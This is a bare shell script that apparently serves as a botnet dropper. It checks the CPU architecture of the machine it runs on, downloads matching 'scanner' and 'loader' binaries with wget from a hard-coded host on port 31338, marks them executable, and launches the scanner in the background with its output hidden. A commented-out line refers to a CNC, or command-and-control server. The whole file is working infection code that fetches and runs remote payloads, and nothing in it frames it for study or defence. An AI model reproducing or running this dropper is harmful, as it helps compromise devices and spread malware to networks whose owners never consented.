#!/bin/sh

arch=$(uname -m | awk '{print tolower($0)}')
ip="192.168.1.97:31338"

if echo "$arch" | grep -qiE 'x86_64|amd64'; then
    wget "http://$ip/amd64_scanner" -O scanner
elif echo "$arch" | grep -qiE 'i386|386'; then
    wget "http://$ip/386_scanner" -O scanner
elif echo "$arch" | grep -qiE 'armv8|arm64|aarch64'; then
    wget "http://$ip/arm64_scanner" -O scanner
elif echo "$arch" | grep -qiE 'arm'; then
    wget "http://$ip/arm_scanner" -O scanner
elif echo "$arch" | grep -qiE 'mips64le'; then 
    wget "http://$ip/mips64le_scanner" -O scanner
elif echo "$arch" | grep -qiE 'mips64'; then 
    wget "http://$ip/mip64_scanner" -O scanner
elif echo "$arch" | grep -qiE 'mips'; then
    wget "http://$ip/mips_scanner" -O scanner
elif echo "$arch" | grep -qiE 'mipsle'; then
    wget "http://$ip/mipsle_scanner" -O scanner
elif echo "$arch" | grep -qiE 'loong64'; then
    wget "http://$ip/loong64_scanner" -O scanner
elif echo "$arch" | grep -qiE 'ppc64le'; then
    wget "http://$ip/ppc64le_scanner" -O scanner
elif echo "$arch" | grep -qiE 'ppc64'; then
    wget "http://$ip/ppc64_scanner" -O scanner
elif echo "$arch" | grep -qiE 'riscv64'; then
    wget "http://$ip/riscv64_scanner" -O scanner
else
    exit
fi
while [ ! -f scanner ]; do
    sleep 1
done
if echo "$arch" | grep -qiE 'x86_64|amd64'; then
    wget "http://$ip/amd64_loader" -O loader
elif echo "$arch" | grep -qiE 'i386|386'; then
    wget "http://$ip/386_loader" -O loader
elif echo "$arch" | grep -qiE 'armv8|arm64|aarch64'; then
    wget "http://$ip/arm64_loader" -O loader
elif echo "$arch" | grep -qiE 'arm'; then
    wget "http://$ip/arm_loader" -O loader
elif echo "$arch" | grep -qiE 'mips64le'; then 
    wget "http://$ip/mips64le_loader" -O loader
elif echo "$arch" | grep -qiE 'mips64'; then 
    wget "http://$ip/mip64_loader" -O loader
elif echo "$arch" | grep -qiE 'mipsle'; then
    wget "http://$ip/mipsle_loader" -O loader
elif echo "$arch" | grep -qiE 'mips'; then
    wget "http://$ip/mips_loader" -O loader
elif echo "$arch" | grep -qiE 'loong64'; then
    wget "http://$ip/loong64_loader" -O loader
elif echo "$arch" | grep -qiE 'ppc64le'; then
    wget "http://$ip/ppc64le_loader" -O loader
elif echo "$arch" | grep -qiE 'ppc64'; then
    wget "http://$ip/ppc64_loader" -O loader
elif echo "$arch" | grep -qiE 'riscv64'; then
    wget "http://$ip/riscv64_loader" -O loader
else
    exit
fi
while [ ! -f loader ]; do
    sleep 1
done
chmod +x scanner
chmod +x loader
./scanner > /dev/null 2>&1 &
#./CNC